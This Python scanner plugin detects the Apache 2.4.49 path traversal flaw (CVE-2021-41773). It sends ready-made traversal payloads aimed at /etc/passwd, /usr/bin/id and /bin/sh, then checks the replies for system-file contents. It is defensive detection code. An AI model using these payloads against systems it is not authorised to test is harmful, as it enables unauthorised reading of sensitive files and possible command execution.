"""
Plugin 1091: Apache HTTP Server 2.4.49 Path Traversal (CVE-2021-41773)
========================================================================
Detects path traversal in Apache HTTP Server 2.4.49.
Real CVE: CVE-2021-41773 (CVSS 7.5)
"""
import asyncio
import ssl

from plugins import NaslPlugin, PluginResult


class ApachePathTraversalDetection(NaslPlugin):
    PLUGIN_ID = 1091
    NAME = 'Apache HTTP Server 2.4.49 Path Traversal'
    FAMILY = 'Web Servers'
    CVSS_SCORE = 7.5
    DESCRIPTION = (
        'Apache HTTP Server 2.4.49 has a path traversal vulnerability in the URL '
        'normalization. An attacker can map URLs to files outside the expected '
        'document root, leading to sensitive file disclosure or RCE if CGI scripts '
        'are enabled.'
    )
    SOLUTION = (
        'Upgrade to Apache HTTP Server 2.4.50 or later. Disable CGI if not needed. '
        'As a mitigation, use "Require all denied" on cgi-bin directory.'
    )
    CVE = ['CVE-2021-41773']
    PORTS = [80, 443, 8080, 8443]

    TRAVERSAL_PATHS = [
        '/cgi-bin/.%2e/%2e%2e/bin/sh',
        '/cgi-bin/.%2e/%2e%2e/usr/bin/id',
        '/cgi-bin/.%2e/%2e%2e/etc/passwd',
    ]

    APACHE_HINTS = [
        b'Apache/2.4.49',
        b'Apache',
        b'Apache HTTP',
    ]

    ROOT_HINTS = [
        b'root:',
        b'nobody:',
        b'bin:',
        b'daemon:',
        b'uid=',
        b'gid=',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx),
                    timeout=5
                )

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for traversal_path in self.TRAVERSAL_PATHS:
                    req = (
                        f'GET {traversal_path} HTTP/1.1\r\n'
                        f'Host: {host_header}\r\n'
                        f'User-Agent: Centra/1.0\r\n'
                        f'Connection: close\r\n\r\n'
                    )
                    writer.write(req.encode())
                    await writer.drain()

                    response = b''
                    try:
                        while True:
                            chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                            if not chunk:
                                break
                            response += chunk
                            if len(response) > 8192:
                                break
                    except asyncio.TimeoutError:
                        pass

                    if response:
                        status_line = response.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                        body_start = response.find(b'\r\n\r\n')
                        body = response[body_start + 4:] if body_start != -1 else b''
                        body_str = body.decode('utf-8', errors='ignore')

                        is_200 = b'200 OK' in response[:50]
                        has_root = any(h in body for h in self.ROOT_HINTS)
                        apache_version_hints = [h for h in self.APACHE_HINTS if h in response]

                        if has_root and is_200:
                            results.append(PluginResult(
                                vulnerable=True,
                                target=target,
                                port=port_to_check,
                                cvss_score=self.CVSS_SCORE,
                                severity='high',
                                description=(
                                    f'Apache HTTP Server 2.4.49 path traversal confirmed on '
                                    f'port {port_to_check} — sensitive files readable via '
                                    f'CVE-2021-41773'
                                ),
                                solution=self.SOLUTION,
                                evidence=(
                                    f'Traversal path: {traversal_path}, '
                                    f'Status: {status_line}, '
                                    f'System file content retrieved'
                                ),
                                references=[
                                    'https://nvd.nist.gov/vuln/detail/CVE-2021-41773',
                                    'https://httpd.apache.org/security/vulnerabilities_24.html',
                                ]
                            ))
                            break

                writer.close()
                await writer.wait_closed()

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No Apache 2.4.49 path traversal indicators detected'
            ))

        return results
